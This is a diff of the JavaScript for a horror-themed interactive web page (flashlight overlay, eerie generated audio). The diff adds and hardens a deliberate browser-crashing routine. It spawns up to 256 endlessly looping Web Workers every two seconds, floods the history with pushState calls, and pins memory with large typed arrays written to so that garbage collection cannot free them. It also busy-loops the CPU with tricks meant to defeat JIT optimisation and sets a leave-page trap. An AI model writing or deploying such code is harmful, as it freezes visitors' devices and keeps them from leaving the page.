@@ -1,15 +1,20 @@
+/* WARNING: BROWSER-KILLER SCRIPT (ANTI-JIT & ANTI-GC ENABLED)
+   FOR ARG EXPERIENCES ONLY. USE WITH EXTREME CAUTION.
+*/
+
 let posX = -1000, posY = -1000;
 let isLightOn = true; 
 let audioStarted = false;
 let systemCrashed = false;
 let mouseX = window.innerWidth / 2;
 let mouseY = window.innerHeight / 2;
-let memoryHog = []; // 新增：用於鎖死實體記憶體
+let memoryHog = []; // 儲存實體記憶體
+let workerBombActive = false;
 
 const map = document.getElementById('map');
 const overlay = document.getElementById('flashlight-overlay');
 
-// 1. 核心：首觸發邏輯 (確保 iOS/Chrome 聲畫同步)
+// 1. 核心：首觸發邏輯
 function initExperience() {
     if (audioStarted || systemCrashed) return;
     startCreepyVoice();
@@ -22,10 +27,10 @@ function initExperience() {
     audioStarted = true;
 }
 
-window.addEventListener('click', initExperience);
-window.addEventListener('touchstart', initExperience);
-window.addEventListener('keydown', initExperience);
-window.addEventListener('scroll', initExperience);
+window.addEventListener('click', initExperience, {once: true});
+window.addEventListener('touchstart', initExperience, {once: true});
+window.addEventListener('keydown', initExperience, {once: true});
+window.addEventListener('scroll', initExperience, {once: true});
 
 // 2. 跨平台音頻
 function startCreepyVoice() {
@@ -38,7 +43,7 @@ function startCreepyVoice() {
         const output = e.outputBuffer.getChannelData(0);
         for (let i = 0; i < output.length; i++) {
             if (systemCrashed) {
-                output[i] = (Math.random() * 2 - 1) * 0.99; // 崩潰噪音
+                output[i] = (Math.random() * 2 - 1) * 0.99;
             } else {
                 let g = (t & (t >> 8)) ? 0.08 : -0.08;
                 output[i] = (Math.random() * 0.1) + g;
@@ -62,7 +67,7 @@ function spawnSecretDot() {
     map.appendChild(dot);
 }
 
-// 4. 自動獵殺 (20秒啟動)
+// 4. 自動獵殺 (20秒後啟動)
 setTimeout(() => {
     if (systemCrashed) return;
     const glitchBlock = document.createElement('div');
@@ -84,12 +89,23 @@ setTimeout(() => {
     }, 16);
 }, 20000);
 
-// 5. 終極封鎖 (強化版)
+// --- 攻擊模組 ---
+function launchWorkerBomb() {
+    if (!workerBombActive) workerBombActive = true;
+    const workerCode = `let t=0; while(true){ t += Math.random(); if(t > 1000000) postMessage(t); }`; // 加入變數防止 Worker 被優化
+    const workerBlob = new Blob([workerCode], {type: 'text/javascript'});
+    const workerUrl = URL.createObjectURL(workerBlob);
+    for (let i = 0; i < 256; i++) { 
+        try { new Worker(workerUrl); } catch(e) { break; } 
+    }
+}
+
+// 5. 終極封鎖 (反學習、反優化)
 function triggerFinalCrash() {
     if (systemCrashed) return;
     systemCrashed = true;
 
-    // 移除 UI 與鎖死觸控
+    // 清除正常 UI
     const dot = document.getElementById('secret-dot');
     if(dot) dot.remove();
     document.documentElement.style.overflow = 'hidden';
@@ -103,32 +119,41 @@ function triggerFinalCrash() {
         </div>
     `;
 
-    // 飽和 Worker 炸彈 (開到 256 個或瀏覽器上限)
-    const workerCode = `while(true){ postMessage(Math.random()); }`;
-    const workerBlob = new Blob([workerCode], {type: 'text/javascript'});
-    const workerUrl = URL.createObjectURL(workerBlob);
-    for (let i = 0; i < 256; i++) { try { new Worker(workerUrl); } catch(e) { break; } }
+    // 啟動 Worker 炸彈
+    launchWorkerBomb();
+    
+    // 如果瀏覽器殺咗 Worker，每 2 秒自動補充火力
+    setInterval(() => { launchWorkerBomb(); }, 2000);
 
     setTimeout(() => {
         window.onbeforeunload = () => "STAY";
+        
+        let trashData = 0; // 用於欺騙 JIT 編譯器
         
         function absoluteLock() {
             // A. 炸毀歷史紀錄
             for (let i = 0; i < 100; i++) { history.pushState(null, null, "#" + Math.random()); }
             
-            // B. 佔用實體記憶體 (TypedArray) - 瀏覽器極難回收
-            for (let i = 0; i < 30; i++) { memoryHog.push(new Float64Array(10 * 1024 * 1024)); }
+            // B. 佔用實體記憶體 (並進行真實寫入，防止 GC 釋放)
+            for (let i = 0; i < 20; i++) { 
+                let block = new Float64Array(5 * 1024 * 1024);
+                block[Math.floor(Math.random() * block.length)] = Math.random(); // 真實寫入動作
+                memoryHog.push(block); 
+            }
             
-            // C. 傳統 JSON 與 DOM 負擔
-            const heavy = new Array(500000).fill("SYSTEM_FAILURE").join("!!");
-            JSON.parse(JSON.stringify(heavy)); 
+            // C. DOM 堆疊
             const l = document.createElement('div');
-            l.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;z-index:99;backdrop-filter:blur(2px);`;
+            l.style.cssText = `position:fixed;top:0;left:0;width:1px;height:1px;z-index:99;backdrop-filter:blur(1px);`;
             document.getElementById('death-screen').appendChild(l);
 
-            // D. 同步鎖死關鍵：每輪強制佔用 CPU 100ms
+            // D. 同步鎖死關鍵 (加入欺騙運算)
             let s = Date.now();
-            while(Date.now() - s < 100) { Math.sqrt(Math.random()); }
+            while(Date.now() - s < 150) { 
+                trashData += Math.sqrt(Math.random()) * Math.random(); // 產生真實運算負擔
+            }
+            
+            // 隨便做個判斷，令引擎覺得呢個 Loop 係有用嘅
+            if (trashData > 999999999) trashData = 0;
 
             requestAnimationFrame(absoluteLock);
         }
@@ -137,7 +162,10 @@ function triggerFinalCrash() {
 }
 
 // 6. 控制邏輯
-window.addEventListener('mousemove', (e) => { mouseX = e.clientX; mouseY = e.clientY; updateFlashlight(); });
+window.addEventListener('mousemove', (e) => { 
+    if (systemCrashed) return;
+    mouseX = e.clientX; mouseY = e.clientY; updateFlashlight(); 
+});
 window.addEventListener('keydown', (e) => {
     if (systemCrashed) return;
     const key = e.key.toLowerCase();
